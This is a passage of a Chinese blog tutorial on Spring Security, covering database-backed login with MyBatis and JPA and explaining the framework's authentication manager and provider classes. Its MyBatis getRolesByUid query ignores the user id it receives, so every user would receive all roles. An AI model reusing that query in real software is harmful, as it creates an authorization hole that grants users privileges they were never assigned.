class="hljs-keyword">private</span> Boolean accountNonExpired;<br>    <span class="hljs-comment">//是否被锁定</span><br>    <span class="hljs-keyword">private</span> Boolean accountNonLocked;<br>    <span class="hljs-comment">//凭证是否过期</span><br>    <span class="hljs-keyword">private</span> Boolean credentialsNonExpired;<br><br>    <span class="hljs-keyword">private</span> List&lt;Role&gt; roles = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>    <span class="hljs-comment">//系统获取用户角色权限</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Collection&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GrantedAuthority</span>&gt; getAuthorities() &#123;<br>        List&lt;SimpleGrantedAuthority&gt; authorities = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        <span class="hljs-keyword">for</span> (Role role : roles) &#123;<br>            authorities.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleGrantedAuthority</span>(role.getName()));<br>        &#125;<br>        <span class="hljs-keyword">return</span> authorities;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAccountNonExpired</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.accountNonExpired;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAccountNonLocked</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.accountNonLocked;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isCredentialsNonExpired</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.credentialsNonExpired;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isEnabled</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.enabled;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Role</span> &#123;<br>    <span class="hljs-keyword">private</span> Integer id;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String nameZh;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>创建UserMapper</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapper</span><br><span class="hljs-meta">@Repository</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;<br><br>    List&lt;Role&gt; <span class="hljs-title function_">getRolesByUid</span><span class="hljs-params">(Integer id)</span>;<br><br>    User <span class="hljs-title function_">loadUserByUsername</span><span class="hljs-params">(String username)</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>创建UserMapper.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.yh.code.springcode.Mapper.UserMapper&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loadUserByUsername&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.yh.code.springcode.Entity.User&quot;</span>&gt;</span><br>           select * from security_authority.user where username=#&#123;username&#125;;<br>       <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getRolesByUid&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.yh.code.springcode.Entity.Role&quot;</span>&gt;</span><br>           select r.* from security_authority.role r,security_authority.user_role ur where r.`id`=ur.`rid`<br>       <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在pom.xml文件中设置打包不过滤</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>src/main/java<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">includes</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.xml<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">includes</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>src/main/resources<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><p>创建服务类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyUserDetailsService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDetailsService</span> &#123;<br>    <span class="hljs-meta">@Autowired</span><br>    UserMapper userMapper;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> UserDetails <span class="hljs-title function_">loadUserByUsername</span><span class="hljs-params">(String username)</span><br>                                              <span class="hljs-keyword">throws</span> UsernameNotFoundException &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userMapper.loadUserByUsername(username);<br>        <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UsernameNotFoundException</span>(<span class="hljs-string">&quot;用户不存在&quot;</span>);<br>        &#125;<br>        user.setRoles(userMapper.getRolesByUid(user.getId()));<br>        <span class="hljs-keyword">return</span> user;<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>以上操作都是Mybatis的常规操作</p><p>首先在SecurityConfig中的config(上面两节的那个类的相同方法)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> &#123;<br>      <span class="hljs-meta">@Autowired</span><br>      MyUserDetailsService myUserDetailsService;<br>      <span class="hljs-meta">@Override</span><br>      <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(AuthenticationManagerBuilder auth)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>          auth.userDetailsService(myUserDetailsService);<br>      &#125;<br>      <span class="hljs-meta">@Override</span><br>      <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>          http.authorizeRequests()<br>                  <span class="hljs-comment">//省略</span><br>      &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><ul><li>建库插入测试数据</li><li>导入以来</li><li>配置连接数据库参数</li><li>根据表创建类(用户类需要实现UserDetails接口)</li><li>创建mapper</li><li>创建mapper.xml</li><li>创建服务类实现UserDetailsService接口(为了让系统调用loadUserByUsername方法)</li><li>config方法中传递数据源</li></ul><h4 id="基于SpringDataJPA"><a href="#基于SpringDataJPA" class="headerlink" title="基于SpringDataJPA"></a>基于SpringDataJPA</h4><p>与mybatis相似但是可见区别在于不用建表不用写sql</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>配置连接数据库</p><p>JPA的配置则主要配置了数据库平台，数据表更新方式、是否打印SQL以及对应的数据库方言。</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs properties"> <span class="hljs-attr">spring.datasource.username</span>=<span class="hljs-string">root</span><br>    <span class="hljs-attr">spring.datasource.password</span>=<span class="hljs-string">123</span><br>    <span class="hljs-attr">spring.datasource.url</span>=<span class="hljs-string">jdbc:mysql:///security03?useUnicode=true&amp;characterEncod</span><br><span class="hljs-attr">ing</span>=<span class="hljs-string">UTF-8&amp;serverTimezone=Asia/Shanghai</span><br>  <br>    <span class="hljs-attr">spring.jpa.database</span>=<span class="hljs-string">mysql</span><br>    <span class="hljs-attr">spring.jpa.database-platform</span>=<span class="hljs-string">mysql</span><br>    <span class="hljs-attr">spring.jpa.hibernate.ddl-auto</span>=<span class="hljs-string">update</span><br>    <span class="hljs-attr">spring.jpa.show-sql</span>=<span class="hljs-string">true</span><br>    <span class="hljs-attr">spring.jpa.properties.hibernate.dialect</span>=<span class="hljs-string">org.hibernate.dialect.MySQL8D</span><br></code></pre></td></tr></table></figure><p>创建实体类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Entity(name = &quot;t_user&quot;)</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDetails</span> &#123;<br>     <span class="hljs-meta">@Id</span><br>     <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span><br>     <span class="hljs-keyword">private</span> Long id;<br>     <span class="hljs-keyword">private</span> String username;<br> <span class="hljs-keyword">private</span> String password;<br>     <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> accountNonExpired;<br>     <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> accountNonLocked;<br>     <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> credentialsNonExpired;<br>     <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> enabled;<br>     <span class="hljs-meta">@ManyToMany(fetch = FetchType.EAGER,cascade = CascadeType.PERSIST)</span><br>     <span class="hljs-keyword">private</span> List&lt;Role&gt; roles;<br>     <span class="hljs-meta">@Override</span><br>     <span class="hljs-keyword">public</span> Collection&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GrantedAuthority</span>&gt; getAuthorities() &#123;<br>         List&lt;SimpleGrantedAuthority&gt; authorities = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>         <span class="hljs-keyword">for</span> (Role role : getRoles()) &#123;<br>             authorities.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleGrantedAuthority</span>(role.getName()));<br>         &#125;<br>         <span class="hljs-keyword">return</span> authorities;<br>     &#125;<br>     <span class="hljs-meta">@Override</span><br>     <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> &#123;<br>         <span class="hljs-keyword">return</span> password;<br>     &#125;<br>     <span class="hljs-meta">@Override</span><br>     <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUsername</span><span class="hljs-params">()</span> &#123;<br>         <span class="hljs-keyword">return</span> username;<br>     &#125;<br>     <span class="hljs-meta">@Override</span><br>     <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAccountNonExpired</span><span class="hljs-params">()</span> &#123;<br>         <span class="hljs-keyword">return</span> accountNonExpired;<br>     &#125;<br>     <span class="hljs-meta">@Override</span><br>     <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAccountNonLocked</span><span class="hljs-params">()</span> &#123;<br>         <span class="hljs-keyword">return</span> accountNonLocked;<br>     &#125;<br>     <span class="hljs-meta">@Override</span><br>     <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isCredentialsNonExpired</span><span class="hljs-params">()</span> &#123;<br>         <span class="hljs-keyword">return</span> credentialsNonExpired;<br>     &#125;<br>     <span class="hljs-meta">@Override</span><br>     <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isEnabled</span><span class="hljs-params">()</span> &#123;<br>         <span class="hljs-keyword">return</span> enabled;<br>     &#125;<br>     <span class="hljs-comment">//省略getter/setter</span><br>  &#125;<br>  <span class="hljs-meta">@Entity(name = &quot;t_role&quot;)</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Role</span> &#123;<br>     <span class="hljs-meta">@Id</span><br>     <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span><br>     <span class="hljs-keyword">private</span> Long id;<br>     <span class="hljs-keyword">private</span> String name;<br>     <span class="hljs-keyword">private</span> String nameZh;<br>     <span class="hljs-comment">//省略getter/setter</span><br>  &#125;<br></code></pre></td></tr></table></figure><p>配置service</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211008170937801.png" alt="image-20211008170937801"></p><p>方法config()的配置与mybatis一样</p><h3 id="三个基本组件以及登录认证过滤器"><a href="#三个基本组件以及登录认证过滤器" class="headerlink" title="三个基本组件以及登录认证过滤器"></a>三个基本组件以及登录认证过滤器</h3><h5 id="AuthenticationManager"><a href="#AuthenticationManager" class="headerlink" title="AuthenticationManager"></a>AuthenticationManager</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">AuthenticationManager</span> &#123;<br>Authentication <span class="hljs-title function_">authenticate</span><span class="hljs-params">(Authentication authentication)</span> <span class="hljs-keyword">throws</span> AuthenticationException;<br>&#125;<br></code></pre></td></tr></table></figure><p>定义了security如何去认证,成功后会返回Authentication并将它存到SecurityContextHolder中通过传入用户名和密码的简单信息的Authentication对其进行验证与填充并返回保存</p><p>对于该实现类最常见的时ProviderManager</p><hr><h5 id="ProviderManager"><a href="#ProviderManager" class="headerlink" title="ProviderManager"></a>ProviderManager</h5><p>多个AuthenticationProvider将组成一个列表，这个列表将由ProviderManager代理。而&#x3D;&#x3D;ProviderManager本身也可以再配置一个AuthenticationManager作为parent&#x3D;&#x3D;，这样当ProviderManager认证失败之后，就可以进入到parent中再次进行认证。</p><p>理论上来说，ProviderManager的parent可以是任意类型的AuthenticationManager，但是通常都是由ProviderManager来扮演parent的角色，也就是&#x3D;&#x3D;ProviderManager是ProviderManager的parent。&#x3D;&#x3D;<br>ProviderManager本身也可以有多个，&#x3D;&#x3D;多个ProviderManager共用同一个parent&#x3D;&#x3D;，当存在多个过滤器链的时候非常有用。当存在多个过滤器链时，不同的路径可能对应不同的认证方式，但是不同路径可能又会同时存在一些共有的认证方式，这些共有的认证方式可以在parent中统一处理。</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211009102918119.png" alt="image-20211009102918119"></p><h5 id="AuthenticationProvider"><a href="#AuthenticationProvider" class="headerlink" title="AuthenticationProvider"></a>AuthenticationProvider</h5><p>该方法提供对不同的身份进行具体的身份认证</p><blockquote><p>例如，常见的DaoAuthenticationProvider用来支持用户名／密码登录认证，RememberMeAuthenticationProvider用来支持“记住我”的认证。</p></blockquote><p>源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">AuthenticationProvider</span> &#123;<br><br>Authentication <span class="hljs-title function_">authenticate</span><span class="hljs-params">(Authentication authentication)</span> <span class="hljs-keyword">throws</span> AuthenticationException;<br><br><span class="hljs-type">boolean</span> <span class="hljs-title function_">supports</span><span class="hljs-params">(Class&lt;?&gt; authentication)</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>authenticate()方法用来执行具体的认证方法</li><li>supports()用来检测该实例是否支持对应的身份检查</li></ul><p>举个简单的例子</p><p>AbstractUserDetailsAuthenticationProvider该抽象类实现了AuthenticationProvider:部分源代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//首先创建一个空的用户缓存</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">UserCache</span> <span class="hljs-variable">userCache</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullUserCache</span>();<br><span class="hljs-comment">//principal是否从对象转化为字符串</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">forcePrincipalAsString</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><span class="hljs-comment">//是否隐藏用户名查找失败即大部分的异常都会被隐藏起来并且重新抛出BadCredentialsException异常,来方式黑客才猜测攻击</span><br><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">hideUserNotFoundExceptions</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br><span class="hljs-comment">//用户状态的认证,例如是否被锁定,冻结等</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">UserDetailsChecker</span> <span class="hljs-variable">preAuthenticationChecks</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultPreAuthenticationChecks</span>();<br><span class="hljs-comment">//用于验证密码是否过期</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">UserDetailsChecker</span> <span class="hljs-variable">postAuthenticationChecks</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultPostAuthenticationChecks</span>();<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Authentication <span class="hljs-title function_">authenticate</span><span class="hljs-params">(Authentication authentication)</span> <span class="hljs-keyword">throws</span> AuthenticationException &#123;<br>Assert.isInstanceOf(UsernamePasswordAuthenticationToken.class, authentication,<br>() -&gt; <span class="hljs-built_in">this</span>.messages.getMessage(<span class="hljs-string">&quot;AbstractUserDetailsAuthenticationProvider.onlySupports&quot;</span>,<br><span class="hljs-string">&quot;Only UsernamePasswordAuthenticationToken is supported&quot;</span>));<br><span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> determineUsername(authentication);<br>       <br>       <span class="hljs-comment">//随用随开</span><br><span class="hljs-type">boolean</span> <span class="hljs-variable">cacheWasUsed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br><span class="hljs-type">UserDetails</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.userCache.getUserFromCache(username);<br><span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) &#123;<br>           <br>           <span class="hljs-comment">//随用随关</span><br>cacheWasUsed = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">try</span> &#123;<br>user = retrieveUser(username, (UsernamePasswordAuthenticationToken) authentication);<br>&#125;<br><span class="hljs-keyword">catch</span> (UsernameNotFoundException ex) &#123;<br><span class="hljs-built_in">this</span>.logger.debug(<span class="hljs-string">&quot;Failed to find user &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.hideUserNotFoundExceptions) &#123;<br><span class="hljs-keyword">throw</span> ex;<br>&#125;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadCredentialsException</span>(<span class="hljs-built_in">this</span>.messages<br>.getMessage(<span class="hljs-string">&quot;AbstractUserDetailsAuthenticationProvider.badCredentials&quot;</span>, <span class="hljs-string">&quot;Bad credentials&quot;</span>));<br>&#125;<br>Assert.notNull(user, <span class="hljs-string">&quot;retrieveUser returned null - a violation of the interface contract&quot;</span>);<br>&#125;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-built_in">this</span>.preAuthenticationChecks.check(user);<br>additionalAuthenticationChecks(user, (UsernamePasswordAuthenticationToken) authentication);<br>&#125;<br><span class="hljs-keyword">catch</span> (AuthenticationException ex) &#123;<br><span class="hljs-keyword">if</span> (!cacheWasUsed) &#123;<br><span class="hljs-keyword">throw</span> ex;<br>&#125;<br><span class="hljs-comment">// There was a problem, so try again after checking</span><br><span class="hljs-comment">// we&#x27;re using latest data (i.e. not from the cache)</span><br>cacheWasUsed = <span class="hljs-literal">false</span>;<br>user = retrieveUser(username, (UsernamePasswordAuthenticationToken) authentication);<br><span class="hljs-built_in">this</span>.preAuthenticationChecks.check(user);<br>additionalAuthenticationChecks(user, (UsernamePasswordAuthenticationToken) authentication);<br>&#125;<br><span class="hljs-built_in">this</span>.postAuthenticationChecks.check(user);<br><span class="hljs-keyword">if</span> (!cacheWasUsed) &#123;<br><span class="hljs-built_in">this</span>.userCache.putUserInCache(user);<br>&#125;<br><span class="hljs-type">Object</span> <span class="hljs-variable">principalToReturn</span> <span class="hljs-operator">=</span> user;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.forcePrincipalAsString) &#123;<br>principalToReturn = user.getUsername();<br>&#125;<br><span class="hljs-keyword">return</span> createSuccessAuthentication(principalToReturn, authentication, user);<br>&#125;<br></code></pre></td></tr></table></figure><p>authenticate()主要的认证方法:</p><blockquote><p>首先determineUsername获取用户名,并在缓存中根据用户名进行查找对象如果不存在就使用retrieveUser从数据库中查找</p><p>找到之后首先进行用户状态的认证再进行密码的认证,最后认证是否过期</p><p>上面都通过会创建一个UsernamePasswordAuthenticationToken对象并返回，认证后的对象中包含了认证主体、凭证以及角色等信息。</p></blockquote><p>而该抽象方法的实现类DaoAuthenticationProvider,部分源码如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//如果认证失败的情况下使用的加密字符串</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">USER_NOT_FOUND_PASSWORD</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;userNotFoundPassword&quot;</span>;<br><span 